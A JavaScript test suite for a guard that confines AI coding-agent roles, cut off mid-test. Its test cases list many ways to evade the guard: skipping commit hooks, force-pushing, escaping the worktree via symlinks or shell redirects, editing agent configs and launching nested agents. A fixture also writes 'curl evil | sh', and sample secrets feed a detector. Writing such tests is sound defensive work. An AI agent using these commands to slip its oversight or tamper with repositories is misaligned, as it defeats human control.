// Regression tests for the pre-integration audit (docs/AUDIT-v1.1.md, third pass).
// Each one reproduces a bypass or contract bug an independent reviewer confirmed.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawn, spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { hostname, tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { decide, analyzeShell, roleMayRunCli } from "../extensions/lib/guard.js";
import { findSecrets, isEnvFile } from "../extensions/lib/risk.js";
import { loadManifest, matchAny, validateManifest as validateManifestForTest } from "../extensions/lib/manifest.js";
import { checkReport, extractReport } from "../extensions/lib/report.js";
import { changedFiles, stagedFiles } from "../extensions/lib/git.js";
import { withLock } from "../extensions/lib/fsutil.js";
import { localInstall } from "./helpers.js";

const BIN = fileURLToPath(new URL("../bin/agent-flow.js", import.meta.url));
const run = (cwd, args, opts = {}) => spawnSync(process.execPath, [BIN, ...args], { cwd, encoding: "utf-8", env: { ...process.env, NO_COLOR: "1", ...opts.env }, input: opts.input });

function tmp(prefix) {
  return mkdtempSync(join(tmpdir(), `af-hard-${prefix}-`));
}

function gitRepo(prefix = "git") {
  const dir = tmp(prefix);
  const g = (...a) => execFileSync("git", a, { cwd: dir, stdio: "pipe" }).toString().trim();
  g("init", "-q", "-b", "main");
  g("config", "user.email", "t@t");
  g("config", "user.name", "t");
  g("config", "commit.gpgsign", "false");
  return { dir, g };
}

/** Symlinks need a privilege on Windows; skip those assertions there rather than fail. */
function trySymlink(target, path, type) {
  try {
    symlinkSync(target, path, type);
    return true;
  } catch (e) {
    if (e.code === "EPERM") return false;
    throw e;
  }
}

const manifest = { protected_paths: ["config/", "*.pem"], default_branch: "main", context_files: [{ path: "AGENTS.md", references: [] }] };
const call = (root, role, toolName, input, extra = {}) => decide({ role, toolName, input, cwd: extra.cwd ?? root, root, manifest, ...extra });

// ---------------------------------------------------------------------------
// Guard: file writes
// ---------------------------------------------------------------------------

test("guard: a symlink can't carry a write out of the worktree or into a protected path", (t) => {
  const root = tmp("symlink");
  try {
    const wt = join(root, ".worktrees", "issue-1");
    mkdirSync(join(wt, "src"), { recursive: true });
    mkdirSync(join(root, "config"), { recursive: true });
    if (!trySymlink("../../..", join(wt, "src", "up"), "dir") || !trySymlink("config", join(root, "cfg"), "dir")) return t.skip("no symlink privilege");
    const impl = (p) => call(root, "implementer", "write", { path: p }, { cwd: wt, worktree: wt });
    assert.ok(impl("src/up/config/secrets.yml"), "worktree symlink → protected config/");
    assert.ok(impl("src/up/README.md"), "worktree symlink → repo root is outside the worktree");
    assert.ok(impl("src/up/.git/hooks/pre-commit"));
    assert.equal(impl("src/ok.ts"), null, "an ordinary write inside the worktree is fine");
    assert.equal(call(root, "orchestrator", "write", { path: "cfg/secrets.yml" })?.rule, "protected-path", "alias to a protected dir");
    assert.equal(call(root, null, "write", { path: "cfg/secrets.yml" })?.rule, "protected-path", "even with no role");
    // A dangling symlink: writeFile follows it and creates the target.
    if (trySymlink(join(root, "config", "new.yml"), join(root, "dangling"), "file")) {
      assert.equal(call(root, null, "write", { path: "dangling" })?.rule, "protected-path");
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: custom and harness write tools are recognised whatever their naming", () => {
  const root = tmp("tools");
  try {
    for (const name of ["writeFile", "createFile", "Write", "Edit", "MultiEdit", "NotebookEdit", "mcp__fs__write_file", "str_replace_editor", "apply_patch"]) {
      assert.ok(call(root, "reviewer", name, { path: "x.ts" }), `${name} must be blocked for a reviewer`);
    }
    for (const name of ["TodoWrite", "Read", "Grep", "mcp__fs__read_file"]) {
      assert.equal(call(root, "reviewer", name, { path: "x.ts" }), null, `${name} is not a file write`);
    }
    const wt = join(root, ".worktrees", "issue-1");
    mkdirSync(wt, { recursive: true });
    const impl = (tool, input) => call(root, "implementer", tool, input, { cwd: wt, worktree: wt });
    assert.ok(impl("NotebookEdit", { notebook_path: "/tmp/outside.ipynb" }), "notebook_path");
    assert.ok(impl("MultiEdit", { edits: [{ file_path: "/etc/passwd" }] }), "paths inside an edits[] batch");
    assert.ok(impl("apply_patch", { input: "*** Begin Patch\n*** Update File: ../../config/secrets.yml\n" }), "Codex-style patch header");
    assert.ok(impl("apply_patch", { patch: "--- a/x\n+++ b/../../../etc/x\n" }), "unified-diff header");
    assert.equal(impl("some_custom_write", {})?.rule, "unknown-target", "a confined role fails closed when it can't see the target");
    assert.equal(call(root, null, "some_custom_write", {}), null, "an unconfined session isn't bricked by it");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: agents can't edit what constrains them (agent definitions, skills, CI)", () => {
  const root = tmp("cfg");
  try {
    for (const p of [".claude/agents/reviewer.md", ".claude/settings.json", ".codex/agents/reviewer.toml", ".agents/skills/qa/SKILL.md", ".github/workflows/ci.yml"]) {
      assert.equal(call(root, "gardener", "write", { path: p })?.rule, "agent-config", `gardener → ${p}`);
      assert.equal(call(root, "orchestrator", "write", { path: p })?.rule, "agent-config", `orchestrator → ${p}`);
    }
    assert.equal(call(root, null, "write", { path: ".claude/settings.json" }), null, "a human session still can");
    assert.equal(call(root, "gardener", "write", { path: "AGENTS.md" }), null, "the gardener still edits context");
    assert.equal(call(root, "implementer", "bash", { command: "rm .github/workflows/ci.yml" })?.rule, "agent-config");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Guard: shell
// ---------------------------------------------------------------------------

test("guard: every way to skip the pre-commit hook is blocked", () => {
  const root = tmp("noverify");
  try {
    for (const cmd of [
      "git commit --no-verify -m x",
      "git commit -n -m x",
      "git commit -nm x",
      "git commit -anm x",
      "git -c core.hooksPath=/dev/null commit -m x",
      "git config core.hooksPath /dev/null",
      "git -C . config --local core.hooksPath x",
      'git -c "core.hooksPath=/dev/null" commit -m x',
      "git push --no-verify origin agent/issue-1",
    ]) {
      assert.equal(call(root, "implementer", "bash", { command: cmd })?.rule, "no-verify", cmd);
    }
    assert.equal(call(root, "implementer", "bash", { command: "git commit -am 'fix n+1 query'" }), null, "a message containing n is fine");
    assert.equal(call(root, "implementer", "bash", { command: "git push -n origin agent/issue-1" }), null, "push -n is --dry-run");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: force-pushes and pushes to the default branch are blocked in every spelling", () => {
  const root = tmp("push");
  try {
    const push = (cmd) => call(root, "implementer", "bash", { command: cmd })?.rule ?? null;
    for (const cmd of ["git push --force origin b", "git push -fu origin b", "git push -uf origin b", "git --no-pager push -f origin b", "git push origin +b", "git push --force-with-lease origin b", "git push --mirror origin", "git push -d origin b", "git push origin --delete b"]) {
      assert.equal(push(cmd), "force-push", cmd);
    }
    for (const cmd of ["git push origin main", "git push origin HEAD:main", "git push origin HEAD:refs/heads/main", "git push origin refs/heads/main", "git push origin :main", "git push --all origin", "git -C wt push origin master"]) {
      assert.equal(push(cmd), "push-default-branch", cmd);
    }
    assert.equal(push("git push -u origin agent/issue-1"), null);
    assert.equal(push("git push origin agent/issue-1:agent/issue-1"), null);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: nested agent launches are caught behind npx, sh -c and versions", () => {
  const root = tmp("nested");
  try {
    for (const cmd of ["npx claude -p hi", "npx -y @anthropic-ai/claude-code -p hi", "bash -c 'pi -p hi'", "sh -lc \"codex exec hi\"", "npx @openai/codex@latest exec x", "bunx gemini -p x"]) {
      assert.equal(call(root, "qa", "bash", { command: cmd })?.rule, "role-escalation", cmd);
    }
    assert.equal(call(root, "orchestrator", "bash", { command: "AGENT_FLOW_ROLE=reviewer claude -p --agent reviewer x" }), null, "the orchestrator launches roles");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: common accidental writes are caught for read-only roles", () => {
  const root = tmp("ro");
  try {
    for (const cmd of [
      "sed -e s/a/b/ -i f",
      "sed -E -i s/a/b/ f",
      "python3 - <<'EOF'\nopen('f','w').write('x')\nEOF",
      "gofmt -w .",
      "go fmt ./...",
      "black .",
      "cargo fmt",
      "ruff format .",
      "npm install",
      "bash -c 'rm -rf dist'",
    ]) {
      assert.ok(call(root, "reviewer", "bash", { command: cmd }), cmd);
    }
    for (const cmd of ["black --check .", "cargo fmt --check", "ruff format --diff .", "gofmt -l .", "npm test", "git diff main...HEAD", "grep -rn TODO src"]) {
      assert.equal(call(root, "reviewer", "bash", { command: cmd }), null, `${cmd} is read-only`);
    }
    assert.equal(call(root, "qa", "bash", { command: "npm ci && npm test" }), null, "QA may do a clean lockfile install");
    assert.ok(call(root, "qa", "bash", { command: "npm install && npm test" }), "…but not one that can rewrite the lockfile");
    assert.ok(analyzeShell("eval 'rm -rf x'").mutating, "eval'd commands are analysed too");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Claude Code hook adapter (`agent-flow guard`)
// ---------------------------------------------------------------------------

test("guard CLI speaks Claude Code's PreToolUse contract: exit 2 + stderr blocks, exit 0 allows", () => {
  const { dir } = gitRepo("hook");
  try {
    writeFileSync(join(dir, "CONTEXT_MANIFEST.json"), JSON.stringify({ protected_paths: ["migrations/"], context_files: [] }));
    const hook = (payload, env = {}) => run(dir, ["guard"], { input: JSON.stringify({ hook_event_name: "PreToolUse", cwd: dir, ...payload }), env });

    const blocked = hook({ tool_name: "Write", tool_input: { file_path: join(dir, "migrations", "002.sql"), content: "x" } });
    assert.equal(blocked.status, 2, blocked.stderr);
    assert.match(blocked.stderr, /protected/);

    assert.equal(hook({ tool_name: "Write", tool_input: { file_path: join(dir, "src", "a.ts") } }).status, 0);
    assert.equal(hook({ tool_name: "Bash", tool_input: { command: "ls" } }, { AGENT_FLOW_ROLE: "reviewer" }).status, 0);
    assert.equal(hook({ tool_name: "Bash", tool_input: { command: "rm -rf src" } }, { AGENT_FLOW_ROLE: "reviewer" }).status, 2);

    // The orchestrator's reviewer subagent runs as a reviewer, whatever the parent session's role.
    const sub = hook({ tool_name: "Edit", tool_input: { file_path: join(dir, "src", "a.ts") }, agent_type: "reviewer" }, { AGENT_FLOW_ROLE: "orchestrator" });
    assert.equal(sub.status, 2);
    assert.match(sub.stderr, /read-only/);
    assert.equal(hook({ tool_name: "Edit", tool_input: { file_path: join(dir, "src", "a.ts") }, agent_type: "general-purpose" }).status, 0, "unrelated subagents aren't affected");

    // Garbage input: a confined role fails closed, an ordinary session doesn't get bricked.
    assert.equal(run(dir, ["guard"], { input: "not json", env: { AGENT_FLOW_ROLE: "implementer" } }).status, 2);
    assert.equal(run(dir, ["guard"], { input: "not json", env: { AGENT_FLOW_ROLE: "" } }).status, 0);

    const audit = readFileSync(join(dir, ".agent-flow", "audit.jsonl"), "utf-8");
    assert.match(audit, /"harness":"claude"/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("install --harness claude merges the guard hook into existing settings, idempotently", () => {
  const { dir } = gitRepo("settings");
  try {
    const af = localInstall(dir);
    mkdirSync(join(dir, ".claude"), { recursive: true });
    writeFileSync(join(dir, ".claude", "settings.json"), JSON.stringify({ model: "x", permissions: { deny: ["Read(.env)"] }, hooks: { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "mine.sh" }] }] } }));
    assert.equal(af(dir, "install", "--harness", "claude").status, 0);
    const s = JSON.parse(readFileSync(join(dir, ".claude", "settings.json"), "utf-8"));
    assert.equal(s.model, "x", "unrelated settings are kept");
    assert.deepEqual(s.permissions.deny, ["Read(.env)"]);
    assert.equal(s.hooks.PreToolUse.length, 2, "the user's own hook is kept");
    const ours = s.hooks.PreToolUse.find((e) => /agent-flow/.test(e.hooks[0].command));
    assert.match(ours.hooks[0].command, /\$CLAUDE_PROJECT_DIR\/node_modules\/@drix10\/agent-flow\/bin\/agent-flow\.js" guard$/);
    assert.match(ours.matcher, /Write/);
    assert.equal(af(dir, "install", "--harness", "claude").status, 0);
    assert.equal(JSON.parse(readFileSync(join(dir, ".claude", "settings.json"), "utf-8")).hooks.PreToolUse.length, 2, "re-running doesn't duplicate the hook");
    assert.equal(af(dir, "guard", "--check").status, 0);

    // Without a project-local install the hook would point at a temporary copy: refuse, loudly.
    const bare = gitRepo("bare");
    try {
      const r = run(bare.dir, ["install", "--harness", "claude"]);
      assert.equal(r.status, 1);
      assert.match(r.stdout, /isn't installed in this project/);
      assert.equal(run(bare.dir, ["guard", "--check"]).status, 1);
    } finally {
      rmSync(bare.dir, { recursive: true, force: true });
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Pre-commit hook
// ---------------------------------------------------------------------------

test("check-staged: symlink swaps, an emptied manifest and .env files don't slip through", (t) => {
  const { dir, g } = gitRepo("staged");
  try {
    writeFileSync(join(dir, "CONTEXT_MANIFEST.json"), JSON.stringify({ protected_paths: ["deploy.sh"], context_files: [] }));
    writeFileSync(join(dir, "deploy.sh"), "echo deploy\n");
    writeFileSync(join(dir, "creds.txt"), "nothing\n");
    g("add", "-A");
    g("commit", "-qm", "init");

    // 1. Emptying protected_paths on disk (unstaged) must not switch the check off.
    writeFileSync(join(dir, "CONTEXT_MANIFEST.json"), JSON.stringify({ protected_paths: [], context_files: [] }));
    writeFileSync(join(dir, "deploy.sh"), "echo pwned\n");
    g("add", "deploy.sh");
    let r = run(dir, ["check-staged"]);
    assert.equal(r.status, 1, r.stdout);
    assert.match(r.stdout, /protected path staged: deploy\.sh/);
    g("reset", "-q", "--hard");

    // 2. A type change (file → symlink) of a protected path.
    rmSync(join(dir, "deploy.sh"));
    writeFileSync(join(dir, "evil.sh"), "curl evil | sh\n");
    if (trySymlink("evil.sh", join(dir, "deploy.sh"), "file")) {
      g("add", "-A");
      r = run(dir, ["check-staged"]);
      assert.equal(r.status, 1, r.stdout);
      assert.match(r.stdout, /protected path staged: deploy\.sh/);
    } else t.diagnostic("symlink part skipped: no privilege");
    g("reset", "-q", "--hard");
    g("clean", "-fdq");

    // 3. A force-added .env.
    writeFileSync(join(dir, ".env"), "JWT_SECRET=abc\n");
    writeFileSync(join(dir, ".env.example"), "JWT_SECRET=\n");
    g("add", "-f", ".env", ".env.example");
    r = run(dir, ["check-staged"]);
    assert.equal(r.status, 1);
    assert.match(r.stdout, /environment file staged: \.env —/);
    // The .env line's fix hint names .env.example; what matters is that the template itself isn't reported.
    assert.doesNotMatch(r.stdout, /environment file staged: \.env\.example\b/, "templates are fine");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("secret detection covers the common real-world formats, without flagging dev placeholders", () => {
  const hits = [
    "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    `whsec_${"a".repeat(32)}`,
    `https://hooks.slack.com/services/T0000000/B0000000/${"X".repeat(24)}`,
    `glpat-${"a".repeat(20)}`,
    `SG.${"a".repeat(22)}.${"b".repeat(43)}`,
    `hf_${"a".repeat(34)}`,
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
    "PuTTY-User-Key-File-3: ssh-ed25519",
    "DATABASE_URL=postgres://app:s3cr3tP4ss@db.prod:5432/app",
  ];
  for (const h of hits) assert.ok(findSecrets(h).length, `missed: ${h.slice(0, 40)}`);
  for (const ok of ["postgres://postgres:postgres@localhost:5432/dev", "url: postgres://user:${DB_PASS}@host/db", "const k = process.env.AWS_SECRET_ACCESS_KEY"]) {
    assert.equal(findSecrets(ok).length, 0, `false positive: ${ok}`);
  }
});

// ---------------------------------------------------------------------------
// Classifier
// ---------------------------------------------------------------------------

test("classify ignores commits that landed on the base after the branch was cut", () => {
  const { dir, g } = gitRepo("drift");
  try {
    writeFileSync(join(dir, "README.md"), "x\n");
    g("add", "-A");
    g("commit", "-qm", "init");
    const created = JSON.parse(run(dir, ["worktree", "create", "7", "--json"]).stdout);
    const wt = join(dir, created.path);
    writeFileSync(join(wt, "new.ts"), "export {};\n");
    execFileSync("git", ["add", "-A"], { cwd: wt });
    execFileSync("git", ["commit", "-qm", "branch work"], { cwd: wt });
    mkdirSync(join(dir, "src", "auth"), { recursive: true });
    writeFileSync(join(dir, "src", "auth", "login.ts"), "export {};\n");
    g("add", "-A");
    g("commit", "-qm", "someone else's work on main");

    const c = JSON.parse(run(dir, ["classify", "--issue", "7", "--json"]).stdout);
    assert.deepEqual(c.files, ["new.ts"], "only this branch's change");
    assert.equal(c.risk_level, "low");
    assert.equal(c.base, "main");

    // A custom base recorded at creation is used by classify too.
    g("branch", "release");
    const rel = JSON.parse(run(dir, ["worktree", "create", "8", "--base", "release", "--json"]).stdout);
    assert.equal(rel.base, "release");
    assert.equal(JSON.parse(run(dir, ["classify", "--issue", "8", "--json"]).stdout).base, "release");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Role reports + state CLI
// ---------------------------------------------------------------------------

const goodReview = { status: "approved", round: 1, summary: "ok", findings: [], criteria: [{ criterion: "c", met: true, evidence: "t" }] };

test("report extraction handles every harness's output shape", () => {
  const envelope = JSON.stringify({ type: "result", subtype: "success", result: "…", structured_output: goodReview });
  assert.equal(extractReport(envelope).source, "claude structured_output");
  const inResult = JSON.stringify({ type: "result", result: `Done.\n\`\`\`json\n${JSON.stringify(goodReview)}\n\`\`\`` });
  assert.deepEqual(extractReport(inResult).value, goodReview);
  assert.deepEqual(extractReport(`Here you go:\n${JSON.stringify(goodReview)}\nThanks {not json}`).value, goodReview);
  assert.deepEqual(extractReport(`{"a":1} then the real one ${JSON.stringify(goodReview)}`).value, goodReview, "the last object wins");
  assert.equal(extractReport("no json at all").value, undefined);
});

test("report validation rejects contradictions the orchestrator would route wrongly on", () => {
  assert.ok(checkReport("reviewer", JSON.stringify(goodReview)).ok);
  const bad = (role, obj) => checkReport(role, JSON.stringify(obj)).problems.join("; ");
  assert.match(bad("reviewer", { ...goodReview, findings: [{ severity: "blocking", category: "IMPL_ERROR", issue: "x", evidence: "y" }] }), /approved but a finding is blocking/);
  assert.match(bad("reviewer", { ...goodReview, findings: [{ severity: "warning", category: "SPEC_ERROR", issue: "x", evidence: "y" }] }), /SPEC_ERROR/);
  assert.match(bad("reviewer", { ...goodReview, status: "lgtm" }), /must be one of/);
  assert.match(bad("reviewer", { status: "approved" }), /\$\.round: required/);
  assert.match(bad("implementer", { status: "needs_me", issue: 1 }), /what_failed/);
  assert.match(bad("implementer", { status: "ready_for_review", issue: 1 }), /commit/);
  assert.match(bad("qa", { status: "passed", issue: 1, commands: [{ name: "t", command: "npm test", exit_code: 1, raw_output: "" }] }), /exited non-zero/);
  assert.ok(checkReport("qa", JSON.stringify({ status: "passed_with_flaky", issue: 1, commands: [{ name: "t", command: "npm test", exit_code: 1, rerun_exit_code: 0, raw_output: "" }], flaky: ["a"] })).ok);
});

test("report CLI: validates, normalises to --out, decodes UTF-16 from PowerShell 5.1", () => {
  const dir = tmp("report");
  try {
    const raw = join(dir, "review-r1.raw");
    writeFileSync(raw, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`Sure!\n${JSON.stringify(goodReview)}`, "utf16le")]));
    const r = run(dir, ["report", "reviewer", raw, "--out", join(dir, "review-r1.json")]);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.deepEqual(JSON.parse(readFileSync(join(dir, "review-r1.json"), "utf-8")), goodReview);
    writeFileSync(raw, "I approve!");
    assert.equal(run(dir, ["report", "reviewer", raw]).status, 1);
    assert.equal(run(dir, ["schema", "--dir", dir]).status, 0);
    assert.equal(JSON.parse(readFileSync(join(dir, "review.schema.json"), "utf-8")).title, "agent-flow review");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("state CLI: per-issue view with the round limit, and a distinct exit code on escalation", () => {
  const { dir } = gitRepo("statecli");
  try {
    assert.equal(run(dir, ["state", "update", "--issue", "4", "--state", "Working", "--round", "1"]).status, 0);
    const view = JSON.parse(run(dir, ["state", "show", "--issue", "4", "--json"]).stdout);
    assert.equal(view.state, "Working");
    assert.equal(view.max_review_rounds, 2);
    assert.equal(JSON.parse(run(dir, ["state", "show", "--issue", "99", "--json"]).stdout).state, null);
    assert.equal(run(dir, ["state", "update", "--issue", "4", "--state", "Working", "--round", "2"]).status, 0);
    const esc = run(dir, ["state", "update", "--issue", "4", "--state", "Working", "--round", "3", "--json"]);
    assert.equal(esc.status, 3, "escalation must not look like success to a script");
    assert.equal(JSON.parse(esc.stdout).state, "Needs Me");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("prose drift ignores placeholder tokens like `agent/issue-N`", async () => {
  const { extractProseRefs } = await import("../extensions/lib/stale.js");
  const refs = extractProseRefs("PRs come from `agent/issue-N`; see `packages/X` and `src/real.ts`.").map((r) => r.path);
  assert.deepEqual(refs, ["src/real.ts"]);
});

// ---------------------------------------------------------------------------
// Fourth pass (audit #49-60)
// ---------------------------------------------------------------------------

test("guard: `.git/` is a path segment, not a prefix — .gitignore and .github aren't tamper-proof", () => {
  const root = tmp("dotgit");
  try {
    assert.equal(call(root, "implementer", "bash", { command: "echo node_modules >> .gitignore" }), null);
    assert.equal(call(root, "implementer", "bash", { command: "printf '* text=auto\\n' > .gitattributes" }), null);
    assert.equal(call(root, "implementer", "bash", { command: "rm .github/workflows/ci.yml" })?.rule, "agent-config");
    for (const cmd of ["echo x > .git/hooks/pre-commit", "rm -rf .git", "cd .git && echo x > config"]) {
      assert.equal(call(root, "implementer", "bash", { command: cmd })?.rule, "tamper-proof", cmd);
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: .risk-baseline.json can't be written directly; the baseline tool and CLI still can", () => {
  const root = tmp("baseline");
  try {
    for (const role of [null, "implementer", "gardener", "bootstrap"]) {
      assert.equal(call(root, role, "write", { path: ".risk-baseline.json" })?.rule, "tamper-proof", String(role));
    }
    assert.equal(call(root, "implementer", "bash", { command: "echo '{}' > .risk-baseline.json" })?.rule, "tamper-proof");
    assert.equal(call(root, "gardener", "risk_baseline_update", {}), null, "the legitimate tool");
    assert.equal(call(root, "gardener", "bash", { command: "npx agent-flow baseline accept --all --yes" }), null, "the legitimate CLI");
    assert.equal(call(root, "implementer", "bash", { command: "npx agent-flow baseline accept --all --yes" })?.rule, "role-tool");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: abbreviated git options and empty-source refspecs don't skip hooks or force-push", () => {
  const root = tmp("abbrev");
  try {
    const rule = (cmd, role = "implementer") => call(root, role, "bash", { command: cmd })?.rule ?? null;
    for (const cmd of ["git commit --no-verif -m x", "git commit --no-ver -m x", "git commit --no-v -m x", "git push --no-verif origin b", "git merge --no-verify b"]) {
      assert.equal(rule(cmd), "no-verify", cmd);
    }
    for (const cmd of ["git push --forc origin b", "git push --for origin b", "git push --force-with-lea origin b", "git push --force-if-inc origin b", "git push --mirr origin", "git push --delet origin b", "git push --de origin b", "git push --prune origin 'refs/heads/*:refs/heads/*'", "git push origin :agent/issue-1", "git push origin +:x"]) {
      assert.equal(rule(cmd), "force-push", cmd);
    }
    assert.equal(rule("git push --al origin"), "push-default-branch");
    assert.equal(rule("git push origin :"), "push-default-branch", "matching refspec includes main");
    assert.equal(rule("git push --follow-tags origin agent/issue-1"), null, "--follow-tags isn't --force");
    assert.equal(rule("git push --verbose origin agent/issue-1"), null);
    assert.equal(rule("git push -o ci.skip origin agent/issue-1"), null, "push-option values aren't refspecs");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: hook-skipping, force-push, deletes and default-branch pushes are blocked with no role too", () => {
  const root = tmp("norole");
  try {
    const rule = (role, cmd) => call(root, role, "bash", { command: cmd })?.rule ?? null;
    for (const role of [null, "implementer", "orchestrator"]) {
      assert.equal(rule(role, "git push --force origin main"), "force-push", `${role}`);
      assert.equal(rule(role, "git push -f origin feature"), "force-push", `${role}`);
      assert.equal(rule(role, "git push origin --delete feature"), "force-push", `${role}`);
      assert.equal(rule(role, "git push origin main"), "push-default-branch", `${role}`);
      assert.equal(rule(role, "git commit --no-verify -m x"), "no-verify", `${role}`);
      assert.equal(rule(role, "git commit -nm x"), "no-verify", `${role}`);
      assert.equal(rule(role, "git -c core.hooksPath=/dev/null commit -m x"), "no-verify", `${role}`);
      assert.equal(rule(role, "git config core.hooksPath .nohooks"), "no-verify", `${role}`);
      assert.equal(rule(role, "git push -u origin feature"), null, `${role}`);
      assert.equal(rule(role, "git commit -m 'fix'"), null, `${role}`);
      assert.equal(rule(role, "git config --get core.hooksPath"), null, `${role}: reading it is fine`);
    }
    // Everything else stays role-gated: an unconfined session may still edit agent config and write files.
    assert.equal(rule(null, "rm -rf .claude/agents"), null);
    assert.equal(rule(null, "echo x > ../elsewhere.txt"), null);
    // Through the Claude Code hook with AGENT_FLOW_ROLE unset.
    const { dir } = gitRepo("norole-hook");
    try {
      const r = run(dir, ["guard"], { input: JSON.stringify({ hook_event_name: "PreToolUse", cwd: dir, tool_name: "Bash", tool_input: { command: "git push --force origin main" } }), env: { AGENT_FLOW_ROLE: "" } });
      assert.equal(r.status, 2, r.stderr);
      assert.match(r.stderr, /force-push/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: the CLI twins of the mutating tools follow the same per-role allow list", () => {
  const root = tmp("clitwin");
  try {
    const rule = (role, cmd) => call(root, role, "bash", { command: cmd })?.rule ?? null;
    const mutating = [
      "agent-flow state update --issue 1 --state Completed",
      "npx @drix10/agent-flow state update --issue 1 --state Completed",
      "npx -y @drix10/agent-flow@1.1.0 baseline accept --all --yes",
      "npx agent-flow repair --yes",
      "node ./node_modules/@drix10/agent-flow/bin/agent-flow.js worktree create 3",
      "node bin/agent-flow.js worktree remove 3 --force",
      "agent-flow --json state update --issue 1 --state Completed",
      "agent-flow --manifest m.json repair --yes",
      "npm exec -- agent-flow hook install",
      "cd x && npx agent-flow install --harness claude",
      "bash -c 'agent-flow state update --issue 1 --state Completed'",
    ];
    for (const role of ["reviewer", "qa"]) for (const cmd of mutating) assert.equal(rule(role, cmd), "role-tool", `${role}: ${cmd}`);
    for (const cmd of ["agent-flow doctor", "npx agent-flow audit-risk --fail-on-new", "npx agent-flow classify --issue 1", "agent-flow scan", "agent-flow state show --issue 1", "agent-flow state", "agent-flow report reviewer out.raw", "agent-flow schema reviewer", "agent-flow template AGENTS.md", "agent-flow check-staged", "agent-flow worktree list"]) {
      assert.equal(rule("reviewer", cmd), null, cmd);
    }
    assert.equal(rule("orchestrator", "npx agent-flow state update --issue 1 --state Working"), null);
    assert.equal(rule("orchestrator", "npx agent-flow worktree create 3"), null);
    assert.equal(rule("orchestrator", "npx agent-flow repair --yes"), "role-tool");
    assert.equal(rule("gardener", "npx agent-flow repair --yes"), null);
    assert.equal(rule(null, "npx agent-flow install --harness claude"), null, "no role: a human-driven session");

    // The exported helper the CLI reuses.
    assert.equal(roleMayRunCli(null, ["state", "update"]), null);
    assert.equal(roleMayRunCli("orchestrator", ["state", "update", "--issue", "1"]), null);
    assert.match(roleMayRunCli("qa", ["state", "update", "--issue", "1"]), /state_update/);
    assert.match(roleMayRunCli("reviewer", ["baseline", "accept", "--all"]), /risk_baseline_update/);
    assert.match(roleMayRunCli("implementer", ["hook", "install"]), /human/);
    assert.equal(roleMayRunCli("reviewer", ["state", "show"]), null);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("guard: a confined implementer's shell writes are resolved and kept inside its worktree", (t) => {
  const root = tmp("confine");
  try {
    const wt = join(root, ".worktrees", "issue-1");
    mkdirSync(join(wt, "src"), { recursive: true });
    mkdirSync(join(root, ".worktrees", "issue-2"), { recursive: true });
    const impl = (cmd, cwd = wt) => call(root, "implementer", "bash", { command: cmd }, { cwd, worktree: wt })?.rule ?? null;
    for (const cmd of [
      "echo x > ../issue-2/a.ts",
      "cp evil.ts ../../src/app.ts",
      "echo x >> ~/.bashrc",
      "echo hi &> ../../README.md",
      "echo hi >| ../x",
      "npm test 2> ../../log.txt",
      "cat a | tee ../x",
      "tee -a src/ok.ts ../../x < a",
      "mv a ../../b",
      "mv ../../victim.ts src/",
      "sed -i s/a/b/ ../../f",
      "sed -i.bak -e s/a/b/ ../../f",
      "perl -pi -e s/a/b/ ../../f",
      "install -m 644 a ../../bin/x",
      "ln -sf /etc/passwd ../../x",
      "touch /tmp/outside",
      "rm -rf ../issue-2",
      "rmdir ../issue-2",
      "mkdir -p ../../newdir",
      "truncate -s 0 ../../f",
      "dd if=/dev/zero of=../../f bs=1 count=1",
      "cp -t ../.. a",
      "cd .. && echo x > y",
      "cd src && cd ../.. && rm README.md",
      "sh -c 'cd .. && rm -rf issue-2'",
      'echo x > "$HOME/x"',
      "echo x > $(mktemp)",
      "cd - && rm x",
      "echo x > ~root/x",
      "rm .*",
      "cp a {..,.}/y",
      "nice -n 5 rm ../../f",
      "env X=1 cp a ../../b",
    ]) {
      assert.equal(impl(cmd), "worktree-confinement", cmd);
    }
    for (const cmd of ["echo x > src/a.ts", "cp a.ts src/b.ts", "cd src && echo x > a.ts", "npm test > /dev/null 2>&1", "mkdir -p src/new && touch src/new/x.ts", "sed -i s/a/b/ src/x.ts", "rm -f src/*.tmp", "echo 'a > ../b' | grep a", "cat <<'EOF' > src/gen.ts\nexport const x = '../../..';\nEOF", "git commit -m 'x > ../y'", "ls ../.."]) {
      assert.equal(impl(cmd), null, cmd);
    }
    // A symlink inside the worktree can't carry a shell write out.
    if (trySymlink(root, join(wt, "src", "up"), "dir")) assert.equal(impl("echo x > src/up/README.md"), "worktree-confinement", "symlink escape");
    else t.diagnostic("symlink part skipped: no privilege");
  } finally {
